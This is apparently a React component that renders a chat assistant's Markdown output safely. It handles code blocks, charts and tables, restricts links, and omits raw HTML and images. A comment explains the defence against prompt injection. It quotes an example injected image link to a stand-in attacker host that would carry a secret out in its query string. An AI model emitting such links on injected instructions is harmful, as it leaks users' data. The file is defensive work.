'use client'

import { BarChart3, Check, Copy, ImageOff } from 'lucide-react'
import { useState, type ReactNode } from 'react'
import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'

import { ChartBlock } from '@/components/chart-block'
import { safeExternalUrl } from '@/lib/api-client'
import { parseChartSpec } from '@/lib/chart'
import { cn } from '@/lib/utils'

function CodeBlock({ language, children }: { language: string; children: ReactNode }) {
  const [copied, setCopied] = useState(false)
  const code = String(children).replace(/\n$/, '')

  async function copy() {
    try {
      await navigator.clipboard.writeText(code)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch {
      // clipboard unavailable (insecure context) — ignore
    }
  }

  return (
    <div className="my-4 overflow-hidden rounded-xl border border-border/70 bg-secondary/30 font-mono text-[13px]">
      <div className="flex items-center justify-between border-b border-border/40 bg-muted/40 px-3.5 py-1.5 text-[11px] text-muted-foreground">
        <span className="uppercase">{language || 'code'}</span>
        <button type="button" onClick={copy} className="flex items-center gap-1 rounded px-1.5 py-0.5 transition-colors hover:bg-secondary hover:text-foreground">
          {copied ? <Check className="size-3 text-emerald-400" /> : <Copy className="size-3" />}
          {copied ? 'Copied' : 'Copy'}
        </button>
      </div>
      <pre className="overflow-x-auto p-4 leading-6">
        <code>{code}</code>
      </pre>
    </div>
  )
}

/** A ```chart block: drawn when its JSON is valid; while it is still streaming, a placeholder. */
function ChartFence({ source }: { source: string }) {
  const chart = parseChartSpec(source)
  if (chart) return <ChartBlock chart={chart} />
  if (!source.trim().endsWith('}')) {
    return (
      <div className="my-4 flex items-center gap-2 rounded-xl border border-dashed border-border/70 px-4 py-6 text-xs text-muted-foreground">
        <BarChart3 className="size-4 animate-pulse text-primary" /> Drawing chart…
      </div>
    )
  }
  return <CodeBlock language="chart">{source}</CodeBlock>
}

/**
 * Model output is untrusted (it can be steered by prompt injection in ingested pages), so:
 * - raw HTML is never rendered,
 * - images are never loaded (an injected ![](https://attacker/?q=secret) would leak data),
 * - links must be http(s) and open without referrer/opener.
 */
const components: Components = {
  a({ href, children }) {
    const url = safeExternalUrl(href)
    if (!url) return <span className="underline decoration-dotted">{children}</span>
    return (
      <a href={url} target="_blank" rel="noopener noreferrer nofollow" className="text-primary underline decoration-primary/40 underline-offset-[3px] hover:decoration-primary">
        {children}
      </a>
    )
  },
  img({ alt }) {
    return (
      <span className="inline-flex items-center gap-1 rounded border border-border/60 px-1.5 py-0.5 text-xs text-muted-foreground">
        <ImageOff className="size-3" />
        {alt || 'image omitted'}
      </span>
    )
  },
  code({ className, children }) {
    const language = /language-([\w-]+)/.exec(className ?? '')?.[1]
    if (language === 'chart') return <ChartFence source={String(children)} />
    if (language !== undefined || String(children).includes('\n')) return <CodeBlock language={language ?? ''}>{children}</CodeBlock>
    return <code className="rounded-md border border-border/60 bg-secondary/60 px-1.5 py-0.5 font-mono text-[12px] text-primary">{children}</code>
  },
  pre({ children }) {
    return <>{children}</>
  },
  table({ children }) {
    return (
      <div className="my-4 overflow-x-auto rounded-xl border border-border/60">
        <table className="w-full border-collapse text-left text-sm">{children}</table>
      </div>
    )
  },
  th({ children }) {
    return <th className="border-b border-border/60 bg-muted/40 px-4 py-2 font-medium text-foreground">{children}</th>
  },
  td({ children }) {
    return <td className="border-t border-border/30 px-4 py-2 text-foreground/80">{children}</td>
  },
}

/** GitHub-flavoured Markdown: tables (answers and comparison reports), strikethrough, task lists. */
const REMARK_PLUGINS = [remarkGfm]

export default function Markdown({ content, className }: { content: string; className?: string }) {
  return (
    <div
      className={cn(
        'prose prose-sm max-w-none break-words dark:prose-invert',
        'prose-p:my-2.5 prose-p:leading-7 prose-headings:font-display prose-headings:font-medium',
        'prose-ul:my-2 prose-ol:my-2 prose-li:my-1 prose-blockquote:border-l-primary prose-blockquote:not-italic',
        className,
      )}
    >
      <ReactMarkdown skipHtml remarkPlugins={REMARK_PLUGINS} components={components}>
        {content}
      </ReactMarkdown>
    </div>
  )
}
